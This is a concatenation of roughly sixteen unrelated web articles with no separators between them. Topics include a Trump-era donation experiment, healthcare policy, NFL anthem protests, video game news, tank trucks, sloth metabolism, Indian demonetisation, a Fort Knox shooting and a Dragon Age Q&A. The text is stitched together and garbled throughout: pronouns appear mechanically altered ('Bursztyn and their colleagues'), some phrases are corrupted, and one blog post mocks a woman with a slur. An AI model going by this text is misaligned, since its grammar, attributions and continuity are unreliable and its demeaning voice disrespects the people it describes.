Leonardo Bursztyn of the University of Chicago, Georgy Egorov of Northwestern University and Stefano Fiorin of the University of California at Los Angeles designed an elaborate experiment to test whether Trump's political success affects Americans' willingness to support, in public, a xenophobic organization. They find that it does — big-time. It's a little finding with big implications. The experiment is pretty complicated, so please bear with me. Two weeks before the election, Bursztyn and their colleagues recruited 458 people from eight states that the website Predictwise said that Trump was certain to win (Alabama, Arkansas, Idaho, Nebraska, Oklahoma, Mississippi, West Virginia and Wyoming). Half the participants were told that Trump would win. The other half received no information about Trump's projected victory. All participants were then asked an assortment of questions, including whether they would authorize the researchers to donate $1 to the Federation for American Immigration Reform, accurately described as an anti-immigrant organization whose founder has written, “I've come to the point of view that for European-American society and culture to persist requires a European-American majority, and a clear one at that.” If participants agreed to authorize the donation, they were told that they would be paid an additional $1. Here's where things get interesting. Half the participants were assured that their decision to authorize a donation would be anonymous. The other half were given no such assurance. On the contrary, they were told that members of the research team might contact them, thus suggesting that their willingness to authorize the donation could become public. For those who were not informed about Trump's expected victory in their state, giving to the anti-immigration group was a lot more attractive when anonymity was assured: 54 per cent authorized the donation under cover of secrecy as opposed to 34 per cent when the authorization might become public. But for those who were informed that Trump would win, anonymity didn't matter at all. When so informed, about half the participants were willing to authorize the donation regardless of whether they received a promise of anonymity.
As an additional test, Bursztyn and their colleagues repeated their experiment in the same states during the first week after Trump's election. They found that Trump's victory also eliminated the effects of anonymity — again, about half the participants authorized the donation regardless of whether the authorization would be public. The upshot is that if Trump had not come on the scene, a lot of Americans would refuse to authorize a donation to an anti-immigrant organization unless they were promised anonymity. But with Trump as president, people feel liberated. Anonymity no longer matters, apparently because Trump's election weakened the social norm against supporting anti-immigrant groups. It's now OK to be known to agree “that for European-American society and culture to persist requires a European-American majority, and a clear one at that.”

Nothing in these findings demonstrates that Trump's election is leading to an erosion of social norms against incivility and hatred, let alone against violence. But they're suggestive. Sometimes people don't say what they think, or do as they like, because of their beliefs about the beliefs of their fellow citizens. A nation's leader can give strong signals about those beliefs — and so diminish the effects of social norms that constrain ugly impulses. Cass R. Sunstein is a Bloomberg View columnist.

House Republicans have at long last unveiled their plan to repeal and replace the Affordable Care Act, and it includes a provision to defund Planned Parenthood, the largest network provider of women's health care in the country.
The GOP's health plan—dubbed the American Health Care Act, or AHCA—released Monday night, restricts fundings to organizations that provide abortions except in the case of rape, incest, or health of the mother. Planned Parenthood currently receives 40% of its operating budget—or around $500 million—from the federal government, none of which can be used for abortion services thanks to the Hyde Amendment.
In fact, 60% of Planned Parenthood's federal funding comes from reimbursements from Medicaid and Title X funding for preventative and primary care (things like birth control and cancer screenings).
“The Government Accountability Office estimates that 390,000 women would lose access and up to 650,000 would face reduced preventive care within a year if Congress blocked Medicaid patients from Planned Parenthood,” CBS News reported earlier this year.
As Buzzfeed notes, the subsidies under the GOP plan cannot be used to purchase health care plans that cover abortion.
Service members hold the flag prior to an NFL game on Sept. 11, 2016, in Baltimore. Patrick Smith/Getty Images
On Sunday, dozens of NFL players took a knee and locked arms during the national anthem, a silent but powerful peaceful protest of the criminal justice system in the United States, as well as a rebuke of President Donald Trump's crude comments and exhortations to fire players who had chosen to protest. While much expressed solidarity with the players' choice to exercise their First Amendment rights and raise the stature of a deeply troubling issue, others were outraged and offended, viewing the gesture as a sign of disrespect toward the flag, America itself, and in particular, the American military.
Since Colin Kaepernick first made headlines with this form of protest, many news outlets have run with comments from prominent retired military officers, veterans groups, or simply veterans willing to comment on the record, suggesting that these gestures are insulting to those who have fought to defend the country, represented by the flag and the anthem. Here's the problem, though: The political beliefs of veterans run the spectrum and vary between different services, different ranks, and different demographics. Veterans are people, too.
The willingness to treat veterans as a single constituency not only does a disservice to veterans as individuals, but it continues to isolate the military from the civilian population, even after they have finished serving. Veterans have over time become a much smaller subsection of the country, facing a “thank you for your service” culture that avoids grappling with the issue of how we as a nation use military force. The desire to disproportionately weight veterans' opinions on this, or any, issue reflects a broader trend of ceding them moral authority, in exchange for ignorance and detachment from the wars they have been asked to fight.
Veterans are similarly valued for their credibility—from the deployment of veterans as stage props during political campaigns to Trump's reliance on retired flag officers in their administration, neatly nicknamed “my generals.” Democrats are no less guilty than Republicans of trotting out veterans to back their policy positions. In the arms race of military support, it's never all that difficult to find a retired flag officer or combat veteran who will agree with any particular political position. That's because “veterans” as a whole aren't monolithic, and neither are their views.
In recent days, some veterans have been circulating a graphic on social media that says, “I served, I stand.” Others have posted photos of themselves kneeling in solidarity with the players, including a 97-year-old World War II veteran photographed kneeling by their grandson, quoted as saying, “Those kids have every right to protest.” On Twitter veterans used the hashtag #VeteransforKaepernick and #TakeAKnee to show support. While it may seem respectful on the surface to invoke the military in voicing one's objection to this protest or other political issues, it's a false flag for engaging in real debate and allowing veterans to engage in that debate as well.
Furthermore, the assumption that all veterans are opposed to the protest also suggests veterans would not themselves be concerned enough with police brutality to kneel. But as one former Green Beret wrote on Facebook, the unifying because their family fought against in three generations of service was the stifling of free speech. They argued that the players' decision to protest is actively patriotic, embodying the peaceful disagreement the military fights on behalf of. The military as a whole is incredibly diverse, and many veterans have undoubtedly themselves experienced the sort of discrimination these gestures are meant to protest. But the services have also struggled to reflect that diversity in the upper echelons of leadership, perhaps leading many to believe that racism is an issue left on the sidelines in the armed forces.
Veterans' views are also often much more nuanced than they are given credit for. Former Army Ranger and Pittsburgh Steeler Alejandro Villanueva left the locker room to stand for the national anthem before Sunday's game, while the rest of the team remained indoors. Yet, when asked about the issue, they told Fox News, “I will be the first one to hold hands with Colin Kaepernick and do something about the way minorities are being treated in the United States, the injustice that is happening with police brutality, the justice system, inequalities in pay. … You can't do it by looking away from the people that are trying to protect our freedom and our country.”
The isolation of the military to a few small communities has made it easier than ever to co-opt military service, when so few Americans are connected enough to veterans to contradict this tendency. Claiming the mantle of patriotism and the support of the veteran community is also good politics, as Trump has notoriously exploited in their speeches. Veterans have also historically been portrayed as conservative, though this trend has been shown to be changing over time. As political scientist Jason Dempsey found in their book, Our Army, the spectrum of political views in the military largely reflects that of the U.S. population as a whole.
Are there veterans who vehemently object to this form of protest? Absolutely. Are there veterans who would kneel in solidarity if given the chance? Absolutely. Veterans, and Americans, will likely remain divided on the manner of this protest, even if most support the players' First Amendment right to do so. At the end of the day, the American public isn't connected enough to the military to understand whether these characterizations are fair or accurate or that two service members with an identical military record may vehemently disagree on any number of things.
That the military has become the center of a national debate about protesting before football games is doubly unfortunate given the conversations that the public too often avoids. There's plenty of room on the airwaves for more discussion over how to reintegrate veterans in society after service, encouraging a broader cross-section of America to serve, funding the military at a level that makes it safe to train and deploy, and perhaps even what we're doing in Afghanistan and whether this country thinks its worth the blood and treasure we continue to spend.
The efforts of those arguing on behalf of veterans that these protests are offensive, unpatriotic, and disrespectful might be better served to advocate for veterans as people rather than as symbols.

“I don't think any of us yet recognize how monumental [Bernie's] campaign was,” says khalid kamau (he asks that their name be lower case) of their run for city council in South Fulton, Georgia. “Every presidential race brings into the political process a new generation of volunteers, but Bernie galvanized a group of highly educated, highly skilled activists, folks pretty much already politically involved. Then, they charged us to run for local office, specifically, as a way of both infiltrating and transforming the Democratic Party, and working our way up the political ladder.”
Kamau observes that South Fulton, newly incorporated into a city, has the possibility of being the largest progressive city in the South.
Here are some other outtakes from kamau's interview with Sarah Jaffe. Click on the player above to give it a listen!
"This is our shot, in Georgia specifically, but in the South in general, to show that [progressive] policies actually do work and that they are not just good ideas, but they are smart ideas and they can grow economies and transform regions and get people involved in their electorate and their local government. Those are things that excite me.
The support [of the Democratic Party] has been tepid, at best. But I see true progressives, unapologetic progressives building a movement that is sort of like the Tea Party, where we are not afraid to endorse in intra-partisan races or non-partisan races.
I don't think this is a personal failure of Bernie, but perhaps of the people that were around them and advising that campaign – is that there wasn't enough attention paid to people of color. I am not sure that people of color who were in that campaign were listened to the way they should have been. The best way to reach out to communities of color is by having candidates of color and instituting these policies in cities of color. If you look at a lot of these most progressive places, they are places like Seattle or Massachusetts. In a lot of these most progressive cities, they tend to be smaller cities, they tend to be more white and more affluent. The idea is that only rich people, only rich white folks can afford to enact this kind of progressive policies. I think it is going to be really important that the leadership of the Democratic Party, specifically, but the left in general, that the leadership needs to look like its base of voters.
I know that there has been all of this angst about “How do we get working class white voters?” But, right now, the most consistent voters in America are black women and the most consistently progressive voters are black and brown folks. We need to grow the base of our party or of that movement with those folks and make sure that we are running candidates in places and instituting policies in places that support those folks. I do think that the big issue of these next few elections, and I think the next twenty years of America, the biggest challenge that we will face is income inequality and this growing disparity. The middle class has disappeared. Now we have a working class and wealthy class. We really need to keep hammering that truth into the public and political conversation that is happening. That is what I hope to do, is to bridge that racial gap for people to understand that whether you are red or yellow, black or white, that we are all suffering from income inequality for the past thirty years.

If you've reached Level 20 in Destiny 2, you've probably found yourself wondering aloud, “What should I be doing now to get those sweet, sweet power levels?” Beginning next Tuesday, Sept. 26, at 2 a.m. PT you'll be able to pledge yourself to one of three factions when the game's Faction Rallies go live.
What that means, in specific terms, is you go to the Tower, talk to one of the three above faction leaders, and then do some activities, like “public events, explore Lost Sectors, complete strikes, clear the raid, or compete in the Crucible.” Do stuff, get faction tokens, exchange faction tokens for loot. It's Destiny! You'll have until 2 a.m. PT on Oct. 3 to collect those tokens and the winning faction will be announced at 10 a.m. PT.
But we know you're really here for the weapons. In addition to the loot, the winning faction will offer a special faction-specific weapon. If you pledged to the winning faction, you can scoop the gun for an easy 1,000 glimmer; if you bet wrong, you can still buy the winning faction's gun, but you'll need to spend a hefty 50,000 glimmer to do it. Suckers.
Let's go through each faction's unique look, loot and weapon, so you can figure out which clique you want to pre-align with. [Note: I'm digging Future War Cult, personally].

Tank truck from 1926
A tank truck, gas truck, fuel truck, or tanker truck (United States usage) or tanker (United Kingdom usage), is a motor vehicle designed to carry liquefied loads, dry bulk cargo or gases on roads. The largest such vehicles are similar to railroad tank cars which are also designed to carry liquefied loads. Many variants exist due to the wide variety of liquids that can be transported. Tank trucks tend to be large; they may be insulated or non-insulated; pressurized or non-pressurized; and designed for single or multiple loads (often by means of internal divisions in their tank). Some are semi-trailer trucks. They are difficult to drive due to their high center of gravity.
Size and volume [ edit ]
Tank trucks are described by their size or volume capacity. Large trucks typically have capacities ranging from 5,500 to 11,600 US gallons (20,800 to 43,900 L; 4,580 to 9,660 imp gal). In Australia, road trains up to four trailers in length (known as Quad tankers) carry loads in excess of 120,000 L. Longer road trains transporting liquids are also in use.
A tank truck is distinguished by its shape, usually a cylindrical tank upon the vehicle lying horizontally. Some less visible distinctions amongst tank trucks have to do with their intended use: compliance with human food regulations, refrigeration capability, acid resistance, pressurization capability, and more. The tanks themselves will almost always contain multiple compartments or baffles to prevent load movement destabilizing the vehicle.
Common large tank trucks [ edit ]
Large tank trucks are used for example to transport gasoline to filling stations. They also transport a wide variety of liquid goods such as liquid sugar, molasses, milk, wine, juices, water, gasoline, diesel, and industrial chemicals.
Tank trucks are constructed of various materials depending on what products they are hauling. These materials include aluminium, carbon steel, stainless steel, and fiberglass reinforced plastic (FRP).
Some tank trucks are able to carry multiple products at once due to compartmentalization of the tank into 2, 3, 4, 5, 6 or in some rare cases more tank compartments. This allows for an increased number of delivery options. These trucks are commonly used to carry different grades of gasoline to service stations to carry all products needed in one trip.
Common small tank trucks [ edit ]
Smaller tank trucks, with a capacity of less than 3,000 US gallons (11,000 L; 2,500 imp gals) are typically used to deal with light liquid cargo within a local community. A common example is vacuum truck used to empty several septic tanks and then deliver the collected fecal sludge to a treatment site. These tank trucks typically have a maximum capacity of 3,000 US gallons (11,000 L; 2,500 imp gal). They are equipped with a pumping system to serve their particular need.
Another common use is to deliver fuel such as liquified petroleum gas (LPG) to households, commerces and industries. The smallest of these trucks usually carry about 1,000 US gallons (3,800 L; 830 imp gal) of LPG under pressure. Typically LPG tank trucks carry up to 3499 US gallons of product (usually liquid propane), on a 2 axle bobtail truck. 3500 US gallons (13,200 L; 2,900 imp gal) and greater requires a 3 axle truck (tank wagon). Some companies are using lightweight steel to carry more gallons on single-axle trucks. Notably, one U.S. manufacturer has built a 3700 US gallon tank truck, fitting it on a single axle.[1]
Tank trucks are also used to fuel aircraft at airports.

14 hospitalized as deck collapses during family photo at NC beach house Copyright by WNCN - All rights reserved Video
By Rod Overton, WNCN News - EMERALD ISLE, NC (WNCN) -- Emerald Isle Police and hospital authorities say as many as 25 people were hurt with at least 14 of those hospitalized after a deck collapsed at a beach house on Saturday evening.
A family was posing for a photo during their last night at the beach when the deck collapsed just before 7 p.m., police and other sources say.
The collapse happened at a beach-front home at 4403 Ocean Drive on Emerald Isle in Carteret County on Saturday.
More than 20 people were on the deck at the time and at least 14 people were hospitalized, officials at Carteret General Hospital and Emerald Isle Police say. Officials said 25 people were hurt, but not all of those were taken to the hospital.
THE LATEST:
2 still in critical condition after deck collapse
Of those hospitalized, two are in critical condition, hospital officials say. Seven ambulances transported the patients along with two medical helicopters.
Two people were transported to another hospital, with one of those taken to New Hanover Regional Medical Center in Wilmington.
The house at 4403 Ocean Drive is called "UNSERHAVEN" and is available for rent and is currently for sale at $1.1 million, according to rental websites and Zillow.
The house has 6 bedrooms, 5 bathrooms, last sold for $360,000 in 1993 and had its last remodel in 1987, according to information from Zillow. Rental data from Bluewater Rentals indicates the house rents for $3,000+ per week during the high season.
The house was occupied by renters at the time of the incident and the family was set to check out on Sunday morning, emergency officials told the Carteret News-Times.
Fire Chief Bill Walker told The Associated Press by phone that a deck section measuring about 12 feet by 12 feet, which they estimated to be at least 10 feet above ground, gave way at the single-story ocean front home on pilings.

Although most of the terrestrial world is covered in trees, there are precious few vertebrates that make the canopy their home and subsist solely on a diet of leaves.
Tree sloths are among the most emblematic tree-dwelling mammals. However, they are best known for their pokey demeanor rather than the fact that they spend the majority of their lives in trees munching leaves. But the slow motion lifestyle of tree sloths, according to a new study, is the direct result of the animal's adaption to its arboreal niche.
“Among vertebrates, this is the rarest of lifestyles,” says Jonathan Pauli, a University of Wisconsin–Madison professor of forest and wildlife ecology and the senior author of a report to appear in the August 2016 edition of the American Naturalist. “When you picture animals that live off plant leaves, they are almost all big — things like moose, elk and deer. What's super interesting about arboreal folivores is that they can't be big.”
Pauli and Wisconsin colleagues M. Zachariah Peery, Emily Fountain and William Karasov set out to measure the energetics of wild two- and three-toed sloths at a field site in in northeastern Costa Rica. The purpose of the study, Pauli says, was to help explain why arboreal folivores are indeed so rare and why more animals have not evolved to take advantage of a widespread ecological niche.
“Most of the world is forested, but the energetic constraints of a leafy diet seem to prevent adaptive radiation,” Pauli notes, referencing the canon of evolutionary biology that helps explain the diversity of life on our planet: As organisms evolve and “radiate” from an ancestral group, they take on a variety of specialized forms that enable them to live a certain lifestyle or occupy a particular niche.
The evolutionary logic of living in trees on a diet solely of leaves, it seems, is less than robust.
“Think about it,” says Pauli. “The food sucks. It's only plant leaves. You have to exploit a very constrained niche.”
To do so, tree sloths require specialized limb adaption, reduced body mass, a slow metabolic rate and claws that act like fulcrums — hooks to accommodate the animals' need to hang in and traverse the treetops.
“This study explains why eating leaves in the canopies of trees leads to life in the slow lane, why fast-moving animals like birds tend not to eat leaves, and why animals like deer that eat a lot of leaves tend to be big and live on the ground,” says Doug Levey, program director in the National Science Foundation's (NSF) Division of Environmental Biology, which funded the research.
The Wisconsin group, which began the NSF-supported study in 2009, used isotopically labeled water to measure the daily energy expenditure of both two- and three-toed sloths, animals that coexist in the tropical forest canopies of Central and South America.
“It takes a suite of extraordinary adaptations to survive in forest canopies, and this may help explain the lack of species diversification among arboreal folivores.” Jonathan Pauli
Astonishingly, three-toed sloths, which are more specialized to their environment, expend as little as 460 kilojoules of energy a day, the equivalent of burning a mere 110 calories — roughly the same number of calories found in a baked potato. It is the lowest measured energetic output for any mammal.
“The measurement was intended to find out what it cost the sloth to live over a day,” says Pauli, who explains that a diet of plant leaves has little nutritional value and the animal's gut size limits it to small amounts per day, so the animals need to find ways to make the most of their skimpy diet. For sloths, that means expending minimal amounts of energy through a reduced metabolic rate, dramatic regulation of body temperature and navigating the world in slow motion.
The group then compared its results with similar studies of wild arboreal folivores from other corners of the globe. The take-home message, says Pauli, is that the more specialized the tree-dwelling animal, the lower the daily energy expenditure.
“The findings reinforce the concept that arboreal folivores are tightly constrained by nutritional energetics,” Pauli notes. “It takes a suite of extraordinary adaptations to survive in forest canopies, and this may help explain the lack of species diversification among arboreal folivores.”
As people across the nation thronged to ATM counters, Congress vice-president Rahul Gandhi queued outside an SBI in New Delhi on Friday. News agency ANI reported that the Gandhi scion had lined up outside an SBI in Parliament Street.

“Gareeb vyakti ko kasht ho raha hai, mai yahan Rs 4000 badalne aaya hoon(Poor people are in trouble, I am here to get Rs 4, 000 exchanged,” they said to the reporters. “Neither you (reporters) nor your crorepati owners nor the Prime Minister will understand the problems faced by people.”
WATCH VIDEO: India Queues Up Outside ATMs
Crowds at the Parliament Street bank were in for a surprise when the 46-year-old leader joined the queue to exchange demonetised currency notes with new ones. Crowds jostled to get a selfie with Gandhi who said that they were there because their people were suffering due to the demonetisation.
“Kya apko yaha koi suit boot pehne dikh raha hai, yaha par sab aam log hai jo pareshan hai, par Modi ji ko isse kya farak padta hai. (Can you see anybody here who is high and mighty? Only the troubled common people are here. But how does it matter to Modiji?)” they said.
According to PTI, Gandhi also interacted with people standing in queue and listened to their troubles. The huge crowd in the bank, that was trying to exchange old notes, faced inconveniences as they had reached there. During the 40 minutes of their stay at the venue, many bank staffers were seen clicking pictures of Gandhi.
AUDIO: Worried About Replacing Rs 500 & Rs 1000 Notes? Don't Fall For This Fraud Call
The Congress vice-president had earlier criticised the government's demonetisation move on Twitter saying that the “real culprits” who had stashed “black money” were “sitting tight” as the farmers, small shopkeepers and housewives faced troubles.

“Once again Mr Modi shows how little they care about ordinary people of this country — farmers, small shop-keepers, housewives — all thrown into utter chaos,” they tweeted. Gandhi also asked, “One question for the PM: How is replacing 1,000 rupee notes with 2,000 rupee notes going to make black money hoarding a lot harder?”
Let me make something clear, I HATE cheaters.
If you cheat, I think you are the lowest of the low. This is why I have no objection to posting this video of a man catching their wife cheating on him. Now, they could have tried to fight the guy, abused their wife, or done something harmful to himself, but instead they took the high road; they videotaped it for the Internet.
Thank you to this great man for putting a message out there for all the cheaters of the world. If you cheat, you will get caught, it will go online and we will all share it. I think my favorite part is when the husband yells "no wonder nothing ever gets done around here." Well, that's a good reason.
Look on the bright side, big smelly cheater whore, at least you're an internet celebrity!

CINCINNATI (Reuters) - A man who worked as a civilian Army employee was shot to death on Wednesday in a parking lot at the Fort Knox Army base in Kentucky in an incident that prompted a security lockdown there, officials said.
Authorities said the shooting was “not a random act” and the shooter remained at large on Wednesday night.
The shooting, which came less than two weeks after a U.S. Marine shot dead two colleagues at a Virginia base, occurred on Wednesday afternoon outside the U.S. Army Human Resources Command headquarters, the Army said in a statement.
The victim, an employee of the Army Human Resources Command, was transported by ambulance to Ireland Army Community Hospital, where they were pronounced dead, the Army said.
“Special Agents from the U.S. Army Criminal Investigation Command are investigating a personal incident and not a random act of violence,” Chris Grey, spokesperson for the independent Army investigative agency, said in the statement.
Fort Knox's gates were locked down to all inbound and outbound traffic as a standard security measure, the Army said. The main gate was reopened an hour later.
Fort Knox, near Louisville, is home to more than 40,000 U.S. military personnel, family members and civilian employees.
Mary Trotman, an FBI spokesperson in Louisville, said two agents were sent to Fort Knox to assist with the probe.
The Army said police were “interested in speaking” with a man who may be using a black Yamaha motorcycle for transportation.
Police in surrounding jurisdictions had earlier been asked by Fort Knox officials to be on the lookout for a man driving a four-door brown car with tinted windows who may have driven off the base, said Bryce Shumate, spokesperson for the police department in nearby Radcliff.
The name of the dead man is being withheld until 24 hours after family notification.
The incident came less than two weeks after a U.S. Marine shot two colleagues to death at the Marine Corps base in Quantico, Virginia, before killing himself.
In February, local media reported that a soldier and their wife died of gunshot wounds at their home on the base in what the Army said appeared to be the result of a domestic dispute.
The Fall stands out as one of the most intriguing download-only releases that has graced the Wii U eShop. Developer Over The Moon originally secured Kickstarter funding for the puzzle-driven experience, with its innovative and atmospheric approach earning praise in our review.
The good news is that the second part of the planned trilogy is coming to the Wii U and other current-gen platforms / PC in Q1 2017 - The Fall Part 2: Unbound. It picks up from the conclusion to the first game, with the AI protagonist ARID seeking a way to their body from a "vast global network". Promising Metroidvania-style exploration, ARID will need to meet and control several different robot bodies that each have their own personalities and quirks. Picking up on the story-telling focus of the first game, we're told to expect a 'though-provoking' tale.

Due to the narrative following on from the first game (though the sequel could work as a standalone experience too, we're told), a major discount on that original is also due on the eShop in the next next couple of weeks, with 80-90% coming off the price for a short time. We'll keep you posted on when that goes live.

Halo Online announced for PC, Russia-only
Closed beta launching in Russia later this month.
Microsoft, Saber Interactive, and Innova Systems announced a free-to-play Halo Online for PC during a press event in Russia today.
The game, which is launching a closed beta in Russia later this month, is powered by a “highly modified version” of the Halo 3 engine optimized for smooth performance on lower-end PCs. It is set on a a secret UNSC space installation called Anvil, where Spartan-IV soldiers train together in war exercises to sharpen their battle skills and test experimental technology.
Asked if consumers outside of Russia will get the opportunity to play Halo Online, Microsoft provided the following response in a Halo Waypoint blog post:
“Right now our focus is on learning as much as we can from the closed beta period in Russia. Theoretically, any expansion outside of Russia would have to go through region-specific changes to address player expectations.”
There are also no plans to bring the game to Xbox One, nor is a definitive launch date set.

For Investors, Is West Town The Next Wicker Park?
By Staff in News on Jan 12, 2014 7:00PM

Long time Chicagoans know that Wicker Park was not always the beacon to commerce that it is today. In the 1960s and '70s, this 80-acre neighborhood located just northwest of the Loop became riddled with gang activity and crime. What followed was a mass exodus of both the original Polish American population and investment funds by financial institutions.
Over the next few decades, though, community groups and the city government attempted to revitalize the neighborhood through new construction and a stronger police presence. What resulted was a gentrification of the region into a thriving beacon of new homes, restaurants, bars, and shopping establishments as property values increased and venture funds poured into the vicinity.
The neighborhood's renovation was nationally recognized in September 2012 when Forbes magazine named Wicker Park as the fourth hippest hipster neighborhood in the United States, calling it an “artists' community known for its galleries, music venues, boutiques, and food options.”
This development raises the question as to whether there is another district within the metropolis that is currently undergoing such a transformation beneath our very noses. A review of citywide activity over the last few years points towards the portion of West Town located just west of Western Avenue between Armitage and Grand Avenues, including both Smith Park and East Humboldt Park.
Like Wicker Park before it, an area of the city once associated with crime and gangland activity is quickly becoming a modern haven for investors and local businesses.
Over the last few years several new restaurants and bars have opened their doors to local denizens. One such establishment was a sushi joint named Kai Zan, which opened its doors in 2012 on the 2500 block of Chicago Avenue. The local eatery, opened by brothers Melvin and Carlo Vizconde (formerly of Kamehachi and Kizoku, respectively) was so popular that it purchased an adjoining space in order to expand upon its initial footprint in order to accommodate additional customers.
Just down the road, a new farm-to-table American gastropub featuring artisanal cocktails, Hunter & Tails, opened in late 2013 in a pastoral two-level space. Its popularity within the neighborhood has led to a brand-new Sunday brunch offering beginning this month.
On the 900 block of Western Avenue, an older bar, named the Sportsman's Club, was renovated last year and introduced a rotating menu of craft cocktails in a lodge-like environment. Further north at the 2400 block of North Avenue, a restaurant featuring classic Indian cuisine opened its doors in 2012 to rave reviews and lines often out the door of patrons salivating at the notion of ingesting their generously spicy portions of Chicken Vindaloo and Veggie Samosas.
The success of local eateries has not gone unnoticed by residential investors. Driving through the area, alone, one can't help but notice the avalanche of new construction single-family homes within the area, as well as condominium developments, such as that located at the intersection of Chicago and Western Avenues.
Furthermore, developers are currently in talks with the city and the local citizens about a seven-story condominium project, with a bottom floor dedicated to commercial space, at the intersections of Grand and Western Avenues.
In addition to recent past developments, the future is bright for this neighborhood as Ald. Roberto Maldonado (26th) announced in September 2013 that the area of Division Street between Western and Cicero Avenues would be resurfaced in the coming year. The city also committed funds to replace sidewalks as needed, fix curbs and gutters, and install both new concrete bus pads and bike lanes.
With the existing extra wide sidewalk footprints and better public transportation access, many investors are exuberant at the notion of the area to be ripe for new housing and restaurants with outdoor patio spots, mimicking the commercialized hustle and bustle of the eastern portion of the city street between Damen and Ashland Avenues.
The future is bright for this area of West Town, and investors are just beginning to take notice.

Amid the raging controversy of R K Pachauri being appointed as the executive vice-chairperson at The Energy and Resources Institute, students have refused to accept degrees from him.
Pachauri is chancellor of Teri University, which is linked to the parent organisation. They face charges of sexually harassing a junior colleague and is out on bail.
In a letter to the officials, the students write, “We would like to make it clear that we are not in a position to accept our degrees from Pachauri at the convocation (to be held on March 7).”
The letter to written to the acting vice-chancellor of TERI University Rajiv Seth and marked to Board of Management further reads, “The recent inaction of our board of management at TERIUniversity with respect to our current chancellor Pachauri deeply saddens us as alumni and a former student body.
"We are aware of Pachauri's immense contributions towards building both TERI and TERIUniversity into what they have become today, and their ability to build global networks, promote the university and institute and to draw funds, projects and grants. Nevertheless, no measure of such contributions can be used to justify alleged criminal behaviour in the form of actions that cause serious harm to another human being.”
The students also request the university administration to re-consider Pachauri's position as the vice-chancellor.
In February last year, a 29-year-old woman had accused Pachauri of sexual harassment, following which they went on leave but joined work in July after a court quashed the internal committee report that found them guilty of misconduct.
Then on Thursday, another woman came forward making similar allegations, accusing Pachauri making sexual advances more than 10 years ago. They further alleged that they had raised the matter to the administrative director of the organisation who refused to believe them allegations.

UPDATE 11/07 2.30PM BST: BioWare has released the second E3 gameplay video walkthrough for Dragon Age: Inquisition, this time focusing on Redcliffe.
UPDATE 9/07 5PM BST: BioWare has released a new Dragon Age: Inquisition gameplay video. It's a walkthrough of the Hinterlands area narrated by creative director Mike Laidlaw.
ORIGINAL STORY 9/07 2.30PM BST: BioWare (collectively Mark Darrah, Mike Laidlaw and Cameron Lee) answered a barrage of questions about Dragon Age: Inquisition on Raptr yesterday. I've combed over the Q&A and reposted, in sections, the relevant information here.
A Tumblr titled andaran atish'an caught a few more details I'll include with an asterisk. I couldn't find them - it's laborious navigation on Ratpr.
Nothing particularly revelatory but some new detail nonetheless.
Character creation
Described as "really in depth"
You'll create your Inquisitor before the big opening cut-scene
Can change inner and outer iris colours*
Can have scars*
Qunari horns are customisable
Male Qunari player model will be smaller than Iron Bull (party member) model
There are "a lot" of lip options
There are no 'body type' choices
Your Inquisitor will also be referred to by their or their surname. (Not clear if the surname will be set and voiced like Shepard in Mass Effect.)
Your background depends on your race/class choice. No dwarven mages
Customisation
Follower's armour will change colour as you equip new gear. Dyes are "still being looked at" for them
"You can use different materials to change how items look and the stats of the items, enchant them, make potions etc," wrote Lee
"Find the template of the new armour you want to look like, then make it from materials which give it the look and stats you want. You wouldn't modify the original armour," added Lee
Qunari don't wear helmets - they have a different head slot
Mage Inquisitors can wear heavy armour as Knight Enchanter by crafting it and then summoning weapons
Level-cap is 25-30
There are three specialisations for each class, and specialisations can affect moments in the story
Specialisations (filled out by Wiki): Knight Enchanter, Necromancer, Rift Mage (Mage); Artificer, Assassin, Tempest (Rogue); Champion, Reaver, Templar (Warrior)
Loot
There will be colour-coded loot according to rarity
Mounts will be earned through quests
Companions
You can hug "some" of them
"Major characters all track something similar to approval, but the system has changed to put more focus on what you are doing and what you say instead of grinding by constantly giving them gifts. Each follower does have their own set of goals they want to achieve and if you help them, they will appreciate it. And if you piss them off, they might just leave," wrote Laidlaw
It matters "a lot" who you take with you on quests
Solas' voice is Welsh
No Mabari (dog) companion
No Shale. "Maybe later. No current plans," wrote Darrah
Voice actors
There's a British and American option for both the male and female Inquisitors, it sounds like
The male Inquisitor can be voiced by Harry Hadden-Paton (British) or Jon Curry (American)
Jon Curry voiced Zevran, a character who won't be in Inquisition (but not for that reason)
Harry Hadden-Paton is less well known
The female Inquisitor can be voiced by Alix Wilton Regan (British) or Sumalee Montano (American)
Alex Wilton Regan was Mass Effect 3's Comm Specialist Samantha Traynor
Sumalee Montano voiced the Enchantress companion in Diablo 3
Darrah said "you may indeed see Gideon Emery again". Emery voiced Dragon Age 2 follower Fenris. Their IMDB page doesn't mention Inquisition
Romance
Eight romances
Two have racial preferences
"There will be romance scenes, but not necessarily just focused on sex," wrote Laidlaw
There will be "at least one" romance option outside of the Inquisition
One will be Lady Josephine Montilyet - AKA Scribbles - who's bisexual
Combat
Combat settings will range from easy to nightmare, as in previous Dragon Age games, but there is not (yet, at least) a story mode*
Rogues can set traps
Stealth had to fit with party combat so sneaking up on people outside of combat and backstabbing them didn't fit the bill
No flailing with fists if you don't have a weapon
"Having control over Fade rifts may provide some interesting possibilities in combat," wrote Lee
You can control abilities individually
There are "lots" of abilities and spells from previous games but a "ton" of new ones too
"Destruction and environment plays a part in combat," wrote Lee
"The tactical combat is more like DAO with the tactical camera (extra improved) and the real-time combat is slower with more weight behind the attacks, defence, hits etc. You can swap between these modes whenever you like and as always you can swap between party members at any time," wrote Lee
There will be cross-class combos possible, as expected. "A lot of abilities can capitalise on states like frozen, or stunned, encouraging teamwork, yes"
Story
As an Inquisitor you're considered holy, to a degree
But how the Chantry - the world's religious organisation - regards you after you walk out of a Fade rift, BioWare doesn't want to say. A major plot point?
Also: "I think the best villains are the ones you can relate to," teased Lee.
"You'll see a lot of Morrigan in Inquisition," added Lee
You can 'judge' people in the world
Missions
There's "a goodly dose" of side missions that are contextualised to make sense as something the Inquisition would be getting involved with, "to either win the hearts of people or otherwise grow the Inquisition's power", for example
Good or evil or joker?
"The overall tone is more neutral," wrote Laidlaw, "until you hit what we call a 'reaction' hub, where you can respond more strongly, often to questions, by being pleased, stoic, angry, sad, etc."
Map
Allows custom plot markers
Can choose which quest is active quest
There's a mini-map
You'll experience snow and rain and dust storms
You can fast-travel but only to Inquisition camps you've set up and populated
Your Inquisition HQ is big - much bigger than any base you've had in Dragon Age games so far
Misc
"There will be some Red Jenny. Because I've wanted to answer 'who ARE they?' for a while now," wrote Laidlaw
Morrigan's Witch mother/dragon Flemeth may return, but you can't visit their shack. "Yep there's a number of recurring NPCs", wrote Lee
Female Dragon Age: Origins dwarf Dagna "does appear" at some point
You can jump but that doesn't mean jumping puzzles*
No flying mounts*
No capes*
DLC
